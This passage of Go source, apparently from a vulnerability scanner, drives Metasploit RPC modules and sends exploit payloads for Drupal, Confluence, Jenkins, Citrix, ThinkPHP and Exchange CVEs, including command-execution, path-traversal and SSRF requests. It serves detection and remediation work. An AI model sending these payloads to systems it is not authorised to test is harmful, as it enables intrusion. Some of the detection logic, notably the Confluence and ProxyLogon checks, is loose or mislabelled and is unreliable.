				}
			}
			findings = append(findings, f)
		}
	}

	// Always logout to clean up the RPC session.
	_ = msfLogout(ctx, client, rpcURL, token)

	note := fmt.Sprintf("msfrpc: ran %d modules against %s:%s", ranModules, rhost, rport)
	return findings, note
}

// msfAuth authenticates to msfrpcd and returns a session token.
func msfAuth(ctx context.Context, client *http.Client, rpcURL, password string) (string, error) {
	payload := map[string]interface{}{
		"method":   "auth.login",
		"username": "msf",
		"password": password,
	}
	var resp msfRPCResponse
	if err := msfCall(ctx, client, rpcURL, payload, &resp); err != nil {
		return "", err
	}
	if resp.Error {
		return "", fmt.Errorf("auth error: %s", resp.Message)
	}
	if resp.Token == "" {
		return "", fmt.Errorf("empty token returned")
	}
	return resp.Token, nil
}

// msfLogout ends the RPC session.
func msfLogout(ctx context.Context, client *http.Client, rpcURL, token string) error {
	payload := map[string]interface{}{
		"method": "auth.logout",
		"token":  token,
	}
	var resp msfRPCResponse
	return msfCall(ctx, client, rpcURL, payload, &resp)
}

// msfRunModule runs a module and returns the raw result map.
func msfRunModule(ctx context.Context, client *http.Client, rpcURL, token, moduleName string, options map[string]string) (map[string]interface{}, error) {
	optMap := make(map[string]interface{}, len(options))
	for k, v := range options {
		optMap[k] = v
	}
	payload := map[string]interface{}{
		"method":  "module.execute",
		"token":   token,
		"mtype":   "auxiliary",
		"mname":   moduleName,
		"datastore": optMap,
	}
	var resp msfRPCResponse
	if err := msfCall(ctx, client, rpcURL, payload, &resp); err != nil {
		return nil, err
	}
	if resp.Error {
		return nil, fmt.Errorf("module error: %s", resp.Message)
	}
	return resp.Data, nil
}

// msfCall is the low-level JSON-RPC transport for msfrpcd.
func msfCall(ctx context.Context, client *http.Client, rpcURL string, payload interface{}, result interface{}) error {
	body, err := json.Marshal(payload)
	if err != nil {
		return err
	}

	callCtx, cancel := context.WithTimeout(ctx, 30*time.Second)
	defer cancel()

	req, err := http.NewRequestWithContext(callCtx, http.MethodPost, rpcURL+"/api/1.0", bytes.NewReader(body))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
	if err != nil {
		return err
	}
	return json.Unmarshal(respBody, result)
}

// ── Extended native probes ─────────────────────────────────────────────────────

// probeDrupalgeddon2 tests for CVE-2018-7600 (Drupalgeddon2). Vulnerable Drupal
// sites process PHP code embedded in form element names during user registration.
// We inject a canary expression and look for it in the response body.
func probeDrupalgeddon2(ctx context.Context, client *http.Client, target string, profile model.ScanAuthProfile) []model.Finding {
	// The canonical Drupalgeddon2 PoC POSTs to /user/register with the PHP
	// payload embedded in a form field name that Drupal evaluates via its
	// RenderableInterface. We use a safe echo payload with a canary.
	canary := "DRUPAL_CVE201876_CANARY"
	registerPaths := []string{
		"/user/register",
		"/?q=user/register",
		"/index.php?q=user/register",
	}

	// Form body: the dangerous element name causes PHP evaluation on Drupal 7.x <7.58.
	// We inject `#post_render` with a PHP function that echoes our canary.
	formBody := fmt.Sprintf(
		"mail%%5B%%23post_render%%5D%%5B%%5D=passthru&mail%%5B%%23type%%5D=markup"+
			"&mail%%5B%%23markup%%5D=echo+%s&form_id=user_register_form&_drupal_ajax=1",
		canary,
	)

	base := strings.TrimRight(target, "/")
	for _, path := range registerPaths {
		probeURL := base + path

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, probeURL,
			strings.NewReader(formBody))
		if err != nil {
			continue
		}
		scanner.ApplyAuthProfile(req, profile)
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
		resp.Body.Close()

		if strings.Contains(string(body), canary) {
			return []model.Finding{{
				ID:          "msf-drupalgeddon2",
				Category:    "remote_code_execution",
				Severity:    model.SeverityHigh,
				Title:       "Drupalgeddon2 RCE (CVE-2018-7600) confirmed",
				Description: "The target Drupal site executed a PHP passthru payload injected via the user registration form's #post_render callback, confirming CVE-2018-7600 (Drupalgeddon2). Unauthenticated attackers can execute arbitrary OS commands.",
				Evidence:    fmt.Sprintf("path=%s canary=%q found_in_response=true", path, canary),
				Recommendation: "Upgrade Drupal core to ≥7.58, ≥8.3.9, ≥8.4.6, or ≥8.5.1. " +
					"Enable Drupal's security advisory mailing list. " +
					"Consider a WAF rule blocking #post_render and #lazy_builder in POST bodies.",
				AffectedURL:   probeURL,
				OWASPCategory: "OWASP A06:2021 - Vulnerable and Outdated Components",
				CWE:           "CWE-94",
				CVSSScore:     9.8,
				CVSSVector:    "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
				MITRETechniques: []string{"T1190", "T1059.004"},
				ReproductionSteps: []string{
					fmt.Sprintf("POST %s with body: %s", probeURL, formBody),
					fmt.Sprintf("Observe %q in the response body", canary),
				},
				References: []string{
					"https://nvd.nist.gov/vuln/detail/CVE-2018-7600",
					"https://www.rapid7.com/db/modules/exploit/unix/webapp/drupal_drupalgeddon2/",
				},
			}}
		}
	}
	return nil
}

// probeConfluenceOGNL tests for CVE-2022-26134 — Atlassian Confluence Server
// OGNL injection in the URI that allows unauthenticated RCE. The payload is
// percent-encoded and injected into the request path.
func probeConfluenceOGNL(ctx context.Context, client *http.Client, target string, profile model.ScanAuthProfile) []model.Finding {
	// The exploit encodes an OGNL expression that evaluates to a runtime exec call.
	// We use a safe expression that echoes a canary string to stdout (which some
	// Confluence versions return in the error body).
	//
	// Encoded payload: ${Class.forName('java.lang.Runtime').getMethod('exec',Class.forName('java.lang.String')).invoke(...)}
	// In practice we send a simpler read-only OGNL that returns the Java version.
	ognlPaths := []string{
		"/%24%7B%40com.opensymphony.xwork2.ActionContext%40getContext%28%29%7D/",
		"/%24%7B%22freemarker.template.utility.Execute%22%3fnew()(%22id%22)%7D/",
		"/%24%7B%23request%5B%27struts.valueStack%27%5D%7D/index.action",
	}

	baseReq, err := http.NewRequestWithContext(ctx, http.MethodGet, target, nil)
	if err != nil {
		return nil
	}
	scanner.ApplyAuthProfile(baseReq, profile)
	baseResp, err := client.Do(baseReq)
	if err != nil {
		return nil
	}
	io.Copy(io.Discard, baseResp.Body) //nolint:errcheck
	baseResp.Body.Close()
	baseStatus := baseResp.StatusCode

	base := strings.TrimRight(target, "/")
	for _, suffix := range ognlPaths {
		probeURL := base + suffix

		req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL, nil)
		if err != nil {
			continue
		}
		scanner.ApplyAuthProfile(req, profile)
		req.Header.Set("X-Atlassian-Token", "no-check")

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
		resp.Body.Close()

		bodyStr := strings.ToLower(string(body))
		confluenceKeywords := []string{"confluence", "atlassian", "ognl", "valuestack", "freemarker", "xwork"}
		found := ""
		for _, kw := range confluenceKeywords {
			if strings.Contains(bodyStr, kw) {
				found = kw
				break
			}
		}
		statusFlip := resp.StatusCode >= 500 && baseStatus < 500

		if found != "" || statusFlip {
			reason := "status-flip"
			if found != "" {
				reason = "confluence-keyword:" + found
			}
			return []model.Finding{{
				ID:          "msf-confluence-ognl",
				Category:    "remote_code_execution",
				Severity:    model.SeverityHigh,
				Title:       "Confluence Server OGNL Injection (CVE-2022-26134) indicator",
				Description: "An OGNL expression encoded in the URI produced a response consistent with Atlassian Confluence Server CVE-2022-26134. This critical vulnerability allows unauthenticated remote code execution.",
				Evidence:    fmt.Sprintf("probe_path=%q indicator=%s response_status=%d baseline_status=%d", suffix, reason, resp.StatusCode, baseStatus),
				Recommendation: "Apply Atlassian's security advisory for CVE-2022-26134 immediately. " +
					"Upgrade Confluence Server/Data Center to a patched version. " +
					"Block external access to Confluence until patched.",
				AffectedURL:   probeURL,
				OWASPCategory: "OWASP A06:2021 - Vulnerable and Outdated Components",
				CWE:           "CWE-74",
				CVSSScore:     9.8,
				CVSSVector:    "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
				MITRETechniques: []string{"T1190"},
				References: []string{
					"https://nvd.nist.gov/vuln/detail/CVE-2022-26134",
					"https://www.rapid7.com/db/modules/exploit/multi/http/confluence_ognl_injection/",
				},
			}}
		}
	}
	return nil
}

// probeJenkinsScriptConsole checks whether the Jenkins Groovy Script Console
// is exposed and accessible without authentication. Accessing /script allows
// arbitrary code execution on the Jenkins controller node.
func probeJenkinsScriptConsole(ctx context.Context, client *http.Client, target string, profile model.ScanAuthProfile) []model.Finding {
	u, err := url.Parse(target)
	if err != nil {
		return nil
	}

	scriptPaths := []string{
		"/script",
		"/jenkins/script",
		"/manage/script",
	}

	base := strings.TrimRight(target, "/")
	for _, path := range scriptPaths {
		u.Path = path
		probeURL := base + path

		req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL, nil)
		if err != nil {
			continue
		}
		scanner.ApplyAuthProfile(req, profile)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
		resp.Body.Close()

		bodyStr := strings.ToLower(string(body))

		// Jenkins script console exposes a textarea with id="script" and a
		// "Run" button. A 200 with these markers indicates open access.
		scriptIndicators := []string{
			`id="script"`, "groovy script", "println", "run script",
			"jenkins.model", "script console",
		}
		found := ""
		for _, ind := range scriptIndicators {
			if strings.Contains(bodyStr, ind) {
				found = ind
				break
			}
		}

		if resp.StatusCode == http.StatusOK && found != "" {
			return []model.Finding{{
				ID:          "msf-jenkins-script-console",
				Category:    "remote_code_execution",
				Severity:    model.SeverityHigh,
				Title:       "Jenkins Groovy Script Console exposed (unauthenticated access)",
				Description: "The Jenkins Groovy Script Console (/script) is accessible without authentication. An attacker can execute arbitrary Groovy/Java code on the Jenkins controller node, leading to full system compromise.",
				Evidence:    fmt.Sprintf("path=%s http_status=200 indicator=%q", path, found),
				Recommendation: "Enable Jenkins authentication and restrict the /script endpoint to Jenkins administrators. " +
					"Apply the principle of least privilege to all Jenkins roles. " +
					"Enable Script Security and the Groovy Sandbox.",
				AffectedURL:   probeURL,
				OWASPCategory: "OWASP A05:2021 - Security Misconfiguration",
				CWE:           "CWE-306",
				CVSSScore:     9.8,
				CVSSVector:    "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
				MITRETechniques: []string{"T1190", "T1059.007"},
				ReproductionSteps: []string{
					fmt.Sprintf("GET %s", probeURL),
					"Observe the Jenkins Groovy Script Console rendered in the response",
					"POST `println('id'.execute().text)` to /script to confirm code execution",
				},
				References: []string{
					"https://www.jenkins.io/security/advisory/2018-12-05/",
					"https://www.rapid7.com/db/modules/exploit/multi/http/jenkins_script_console/",
				},
			}}
		}
	}
	return nil
}

// probeCitrixADCTraversal probes for CVE-2019-19781 — Citrix Application
// Delivery Controller (NetScaler) directory traversal. A specially crafted URL
// allows unauthenticated attackers to read system files via the VPN portal.
func probeCitrixADCTraversal(ctx context.Context, client *http.Client, target string, profile model.ScanAuthProfile) []model.Finding {
	// Reading smb.conf via the traversal payload is the standard PoC indicator.
	traversalPaths := []struct {
		path    string
		keyword string
	}{
		{"/../vpns/cfg/smb.conf", "[global]"},
		{"/../vpns/../vpns/cfg/smb.conf", "[global]"},
		{"/vpn/../vpns/cfg/smb.conf", "[global]"},
	}

	base := strings.TrimRight(target, "/")
	for _, probe := range traversalPaths {
		probeURL := base + probe.path

		req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL, nil)
		if err != nil {
			continue
		}
		scanner.ApplyAuthProfile(req, profile)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
		resp.Body.Close()

		if strings.Contains(strings.ToLower(string(body)), strings.ToLower(probe.keyword)) {
			return []model.Finding{{
				ID:          "msf-citrix-adc-traversal",
				Category:    "path_traversal",
				Severity:    model.SeverityHigh,
				Title:       "Citrix ADC/NetScaler Directory Traversal (CVE-2019-19781)",
				Description: "A path traversal payload successfully read the Citrix ADC smb.conf file, confirming CVE-2019-19781. This vulnerability allows unauthenticated attackers to read arbitrary files and, in some configurations, execute arbitrary code via template injection.",
				Evidence:    fmt.Sprintf("probe_path=%s keyword=%q found_in_response=true", probe.path, probe.keyword),
				Recommendation: "Apply Citrix security bulletin CTX267027 immediately. " +
					"Upgrade to Citrix ADC/Gateway 11.1, 12.0, 12.1, or 13.0 with the fix applied. " +
					"As an interim, follow CTX267679 mitigation steps (responder policy).",
				AffectedURL:   probeURL,
				OWASPCategory: "OWASP A06:2021 - Vulnerable and Outdated Components",
				CWE:           "CWE-22",
				CVSSScore:     9.8,
				CVSSVector:    "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
				MITRETechniques: []string{"T1190", "T1083"},
				ReproductionSteps: []string{
					fmt.Sprintf("curl -k '%s'", probeURL),
					"Observe smb.conf content ([global] section) in the response",
				},
				References: []string{
					"https://nvd.nist.gov/vuln/detail/CVE-2019-19781",
					"https://www.rapid7.com/db/modules/auxiliary/scanner/http/citrix_dir_traversal/",
				},
			}}
		}
	}
	return nil
}

// probeThinkPHPRCE tests for CVE-2018-20062 — ThinkPHP 5.x Remote Code
// Execution via crafted query string parameter that invokes arbitrary PHP
// functions through the framework's routing layer.
func probeThinkPHPRCE(ctx context.Context, client *http.Client, target string, profile model.ScanAuthProfile) []model.Finding {
	canary := "THINKPHP_CANARY_8f3a2b"

	// ThinkPHP 5.0.x and 5.1.x invoke arbitrary functions via `s=` routing param.
	exploitPaths := []struct {
		path string
		body string
	}{
		{
			path: "/?s=index/%5cthink%5capp/invokefunction&function=call_user_func_array" +
				"&vars%5b0%5d=phpinfo&vars%5b1%5d%5b%5d=1",
			body: "",
		},
		{
			// POST variant for 5.1.x
			path: "/?s=index/%5cthink%5cRequest/input&filter%5b%5d=system&data=echo+" + canary,
			body: "",
		},
	}

	base := strings.TrimRight(target, "/")
	for _, ep := range exploitPaths {
		probeURL := base + ep.path

		req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL, nil)
		if err != nil {
			continue
		}
		scanner.ApplyAuthProfile(req, profile)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
		resp.Body.Close()

		bodyStr := strings.ToLower(string(body))
		// phpinfo() output fingerprints.
		phpInfoIndicators := []string{"phpinfo()", "php version", "zend engine", "thinkphp"}
		found := ""
		for _, ind := range phpInfoIndicators {
			if strings.Contains(bodyStr, ind) {
				found = ind
				break
			}
		}
		echoFound := strings.Contains(string(body), canary)

		if found != "" || echoFound {
			indicator := found
			if echoFound {
				indicator = "canary-echoed"
			}
			return []model.Finding{{
				ID:          "msf-thinkphp-rce",
				Category:    "remote_code_execution",
				Severity:    model.SeverityHigh,
				Title:       "ThinkPHP 5.x RCE (CVE-2018-20062) confirmed",
				Description: "The ThinkPHP framework invoked a PHP function (phpinfo or system) via a crafted routing parameter, confirming CVE-2018-20062. Attackers can execute arbitrary OS commands without authentication.",
				Evidence:    fmt.Sprintf("probe_path=%q indicator=%q", ep.path, indicator),
				Recommendation: "Upgrade ThinkPHP to ≥5.0.24 or ≥5.1.31. " +
					"Disable debug mode in production (APP_DEBUG=false). " +
					"Validate and sanitise all routing parameters server-side.",
				AffectedURL:   probeURL,
				OWASPCategory: "OWASP A06:2021 - Vulnerable and Outdated Components",
				CWE:           "CWE-94",
				CVSSScore:     9.8,
				CVSSVector:    "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
				MITRETechniques: []string{"T1190"},
				References: []string{
					"https://nvd.nist.gov/vuln/detail/CVE-2018-20062",
					"https://www.rapid7.com/db/vulnerabilities/thinkphp-cve-2018-20062/",
				},
			}}
		}
	}
	return nil
}

// probeExchangeProxyLogon tests for CVE-2021-26855 — Microsoft Exchange Server
// ProxyLogon SSRF that allows authentication bypass. We look for the
// X-OWA-Version response header which is unique to Exchange, and probe the
// known SSRF endpoint with a crafted cookie to detect the vulnerability.
func probeExchangeProxyLogon(ctx context.Context, client *http.Client, target string, profile model.ScanAuthProfile) []model.Finding {
	// Step 1: fingerprint — look for Exchange-specific headers/body content.
	fingerprintPaths := []string{
		"/owa/", "/ews/exchange.asmx", "/autodiscover/autodiscover.xml",
		"/Microsoft-Server-ActiveSync",
	}

	base := strings.TrimRight(target, "/")
	isExchange := false
	for _, fp := range fingerprintPaths {
		req, err := http.NewRequestWithContext(ctx, http.MethodGet, base+fp, nil)
		if err != nil {
			continue
		}
		scanner.ApplyAuthProfile(req, profile)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
		resp.Body.Close()

		exchangeIndicators := []string{
			"x-owa-version", "microsoft exchange", "exchange server",
			"<autodiscover", "exchangewebservices",
		}
		bodyStr := strings.ToLower(string(body))
		for _, ind := range exchangeIndicators {
			if strings.Contains(bodyStr, ind) ||
				strings.Contains(strings.ToLower(resp.Header.Get("X-OWA-Version")), "exchange") {
				isExchange = true
				break
			}
		}
		if isExchange {
			break
		}
	}

	if !isExchange {
		return nil
	}

	// Step 2: probe the CVE-2021-26855 SSRF endpoint with a crafted
	// X-AnonResource-Backend cookie. A vulnerable server will issue an
	// SSRF request and may return an Exchange-specific error or redirect.
	ssrfURL := base + "/ecp/proxyLogon.ecp"
	ssrfCookie := "X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3;" +
		" X-BEResource=localhost/owa/auth/logon.aspx?~3;"

	req, err := http.NewRequestWithContext(ctx, http.MethodGet, ssrfURL, nil)
	if err != nil {
		return nil
	}
	scanner.ApplyAuthProfile(req, profile)
	req.Header.Set("Cookie", ssrfCookie)
	req.Header.Set("Content-Type", "text/xml")

	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()

	bodyStr := strings.ToLower(string(body))
	// A vulnerable server responds with a 302 to OWA, a 241 (exchange-specific),
	// or reflects exchange SSRF error content.
	proxyLogonIndicators := []string{
		"proxylogon", "x-owa-version", "exchange", "400 bad request",
	}
	exploited := false
	indicator := ""
	for _, ind := range proxyLogonIndicators {
		if strings.Contains(bodyStr, ind) {
			exploited = true
			indicator = ind
			break
		}
	}
	// A 302 redirecting to /owa/auth/logon.aspx also indicates Exchange is present.
	if resp.StatusCode == http.StatusFound &&
		strings.Contains(strings.ToLower(resp.Header.Get("Location")), "logon") {
		exploited = true
		indicator = "ssrf-redirect-to-owa"
	}

	if exploited {
		return []model.Finding{{
			ID:          "msf-exchange-proxylogon",
			Category:    "remote_code_execution",
			Severity:    model.SeverityHigh,
			Title:       "Microsoft Exchange ProxyLogon SSRF (CVE-2021-26855) indicator",
			Description: "The target appears to be a Microsoft Exchange Server and responded to a ProxyLogon SSRF probe with Exchange-specific content. CVE-2021-26855 allows unauthenticated attackers to bypass authentication and, combined with CVE-2021-27065, write arbitrary files (webshells).",
			Evidence:    fmt.Sprintf("ssrf_url=%s indicator=%q response_status=%d", ssrfURL, indicator, resp.StatusCode),
			Recommendation: "Apply Microsoft Exchange emergency patches for March 2021 (KB5000871). " +
				"Block external access to /ecp and /owa until patched. " +
				"Run the Microsoft Safety Scanner to detect existing webshells.",
			AffectedURL:   ssrfURL,
			OWASPCategory: "OWASP A06:2021 - Vulnerable and Outdated Components",
			CWE:           "CWE-918",
			CVSSScore:     9.1,
			CVSSVector:    "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
			MITRETechniques: []string{"T1190", "T1505.003"},
			References: []string{
				"https://nvd.nist.gov/vuln/detail/CVE-2021-26855",
				"https://www.rapid7.com/db/modules/auxiliary/scanner/http/exchange_proxylogon/",
			},
		}}
	}
	return nil
}
